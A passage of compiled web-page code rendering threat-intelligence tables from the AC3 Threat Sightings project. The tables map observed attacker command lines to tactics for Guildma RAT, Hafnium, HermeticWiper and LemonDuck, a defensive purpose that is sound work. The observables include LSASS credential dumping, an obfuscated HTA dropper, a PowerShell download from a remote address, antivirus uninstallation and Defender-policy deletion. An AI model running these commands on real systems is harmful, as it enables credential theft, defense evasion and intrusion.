Escalation"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Reg.exe")," to attempt a known Elevation Control Mechanism bypass for Privilege Escalation."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned CMD for multiple discovery commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores de dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup Administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net Administradoras de grupos locales"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net grupo local administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net user"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," for initiating command execution on remote hosts via ",(0,l.kt)("em",{parentName:"td"},"CMD")," and ",(0,l.kt)("em",{parentName:"td"},"WMIC")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned ",(0,l.kt)("em",{parentName:"td"},"CMD")),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd.exe /C wmic  /node:\\"DC01\\" /user:\\"DOMAIN\\\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin list shadows >> c:\\\\log.txt\\"'))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-guildma-rat"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Guildma RAT")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"td"},".LNK")," file to lure users for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},".LNK")," file triggered ",(0,l.kt)("em",{parentName:"td"},"CMD.exe")," with obfuscated command-line"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /V/D/c \\\"seT sKk=script&&seT px=powershell&&SEt NEGG=C:\\\\Users\\\\Public\\\\Videos\\\\^YqW&&SEt SMO=.H&&SEt XQGZ=^<!sKk!^>try{v6POar c=\\'!sKk!:\\';d=\\'h6POTtP:\\';G6POetObj6POect(c+d+\\'&&sET FIC=ZXEFMZXEFMwaa8.nolii.dateZXEFM?1ZXEFM\\');}catch(e){}close();^</!sKk!^>&&sEt/^p YE8N=\\\"%XQGZ:6PO=%%FIC:ZXEFM=/%\\\"<nul > %NEGG%%SMO%ta\\|!px! -Command \\\"& \\'!NEGG!!SMO!ta\\' \\\""))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to run obfuscated command that drops ",(0,l.kt)("em",{parentName:"td"},"HTA")," file for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD.exe")," spawned with an obfuscated command-line"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\Windows\\system32\\cmd.exe  /S /D /c\\" sEt/p YE8N=\\"%XQGZ:6PO=%%FIC:ZXEFM=/%\\" 0<nul 1>%NEGG%%SMO%ta\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to run obfuscated command that drops ",(0,l.kt)("em",{parentName:"td"},"HTA")," file for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},".hta file is created under C:","\\","Users","\\","Public","\\","Videos folder"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\Videos\\\\YqW.Hta"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to orchestrate the download of Guildma DLL and other artifacts via ",(0,l.kt)("em",{parentName:"td"},"BITSadmin")," for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe is launched by mshta.exe to write content into a file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\cmd.exe" /V /C "echo C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\>C:\\\\Users\\\\Public\\\\lu"&& exit'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to orchestrate the download of Guildma DLL and other artifacts via ",(0,l.kt)("em",{parentName:"td"},"BITSadmin")," for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe creates a file called lu (likely an internal flag used by the malware)"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\lu"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to launch a ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," command that loads Guildma DLL for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},"Another CMD.exe is spawned by mshta.exe to execute PowerShell.exe"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\cmd.exe" /c cd C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\&& ^start ^/W ^/MIN powershell -windowstyle hidden -Command "& "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe" C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.log "&& timeout 3600'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," scripts to launch ",(0,l.kt)("em",{parentName:"td"},"Guildma DLL")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe is spawned by mshta.exe to create another file in C:","\\","Users","\\","Public","\\","Videos file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\cmd.exe" /V /C "echo gharobhnpuluguaoqzgezkk >C:\\Users\\Public\\Videos\\VEO46570203888O\\\\r1.log"&& exit'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," scripts to launch ",(0,l.kt)("em",{parentName:"td"},"Guildma DLL")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe creates a file called r1.log"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\r1.log"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-hafnium"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Hafnium")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Hafnium.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Hafnium.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"nltest, net and other basic commands via China Chopper Web Shell")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns discovery commands (",(0,l.kt)("em",{parentName:"td"},"query.exe"),", ",(0,l.kt)("em",{parentName:"td"},"hostname.exe"),", ",(0,l.kt)("em",{parentName:"td"},"ping.exe"),", ",(0,l.kt)("em",{parentName:"td"},"tasklist.exe"),", ",(0,l.kt)("em",{parentName:"td"},"whoami.exe"),")."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"query user"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"hostname"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"ping #{dst} -n 1"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"tasklist\\|findstr dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"tasklist"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"nltest, net and other basic commands via China Chopper Web Shell")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns ",(0,l.kt)("em",{parentName:"td"},"nltest.exe")," and ",(0,l.kt)("em",{parentName:"td"},"net.exe")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"nltest /dclist:#{DOMAIN}"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group \\"Domain computers\\" /do'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"wmic via China Chopper Web Shell")," to list running processes for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD")," commands for execution of ",(0,l.kt)("em",{parentName:"td"},"WMIC")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&wmic process where name=smex_master.exe get ExecutablePath,commandline&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&wmic process where name=unsecapp.exe get ExecutablePath&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&wmic process where name=unsecapp.exe get processid&echo [S]&cd&echo [E]"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"wmic via China Chopper Web Shell")," to list running processes for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns ",(0,l.kt)("em",{parentName:"td"},"wmic.exe")," discovery commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"wmic process where name=smex_master.exe get ExecutablePath,commandline"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"wmic process where name=unsecapp.exe get ExecutablePath"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"wmic process where name=unsecapp.exe get processid"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Procdump64 via China Chopper Web Shell")," for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD")," to execute ",(0,l.kt)("em",{parentName:"td"},"Procdump64"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\root&procdump64.exe -accepteula -ma lsass.exe lsass.dmp&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d E:\\\\logs&procdump64.exe -accepteula -ma lsass.exe lsass.dmp&echo [S]&cd&echo [E]"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Procdump64 via China Chopper Web Shell")," for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns ",(0,l.kt)("em",{parentName:"td"},"Procdump64")),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"procdump64.exe -accepteula -ma lsass.exe lsass.dmp"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"procdump64.exe -accepteula -ma lsass.exe lsass.dmp"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD del commands via China Chopper Web Shell")," to delete Web Shell files for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD")," to run delete commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:/inetpub/wwwroot/aspnet_client&del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookEN.aspx'&echo [S]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:/inetpub/wwwroot/aspnet_client&del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\TimeoutLogout.aspx'&echo [S]"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD del commands via China Chopper Web Shell")," to delete Web Shell files for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," executes ",(0,l.kt)("em",{parentName:"td"},"del")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookEN.aspx"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\TimeoutLogout.aspx"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"net group del commands via China Chopper Web Shell")," to deleted Active Directory groups for Impact."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD")),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&net group "Exchange Organization administrators" administrator /del /domain&echo [S]&cd&echo [E]'))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-hermeticwiper"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"HermeticWiper")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_HermeticWiper.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_HermeticWiper.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used likely ",(0,l.kt)("em",{parentName:"td"},"WMI")," and ",(0,l.kt)("em",{parentName:"td"},"Impacket")," to execute ",(0,l.kt)("em",{parentName:"td"},"CMD")," commands on victim endpoints for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," executions with command-line patterns similar to ",(0,l.kt)("em",{parentName:"td"},"Impacket"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c powershell -c \\\"(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1')\\\"> \\\\\\\\127.0.0.1\\\\ADMIN$\\__[TIMESTAMP] 2>&1"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1 CSIDL_WINDOWS\\\\policydefinitions\\\\postgresql.exe 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__1636727589.6007507 2>&1"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd.exe /Q /c powershell -c \\"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full\\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072 2>&1'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS")," to periodically create malicious file at Windows Policy Definition folder for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD move")," file from ",(0,l.kt)("em",{parentName:"td"},"Temp")," folder to Windows Policy Definition folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1 CSIDL_WINDOWS\\\\policydefinitions\\\\postgresql.exe 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__1636727589.6007507 2>&1"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"COM+ Service DLL")," to dump ",(0,l.kt)("em",{parentName:"td"},"LSASS")," process memory via ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," and ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," executions with ",(0,l.kt)("em",{parentName:"td"},"Impacket")," patterns in command-line."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd.exe /Q /c powershell -c \\"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full\\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072 2>&1'))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-lemonduck-malware"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"LemonDuck Malware")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_LemonDuck_Malware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_LemonDuck_Malware.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"WMIC")," to uninstall software security solutions via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawns multiple execution of ",(0,l.kt)("em",{parentName:"td"},"CMD")," to uninstall software security solutions via ",(0,l.kt)("em",{parentName:"td"},"WMIC"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Eset%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Kaspersky%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%avast%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Security%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%AntiVirus%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Norton Security%\\\'\\" call uninstall /nointeractive'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Reg.exe")," to disable Windows Defender Policies via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawns multiple executions of ",(0,l.kt)("em",{parentName:"td"},"CMD")," to run ",(0,l.kt)("em",{parentName:"td"},"Reg.exe"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /f'),(0,l.kt)("br",null),"- 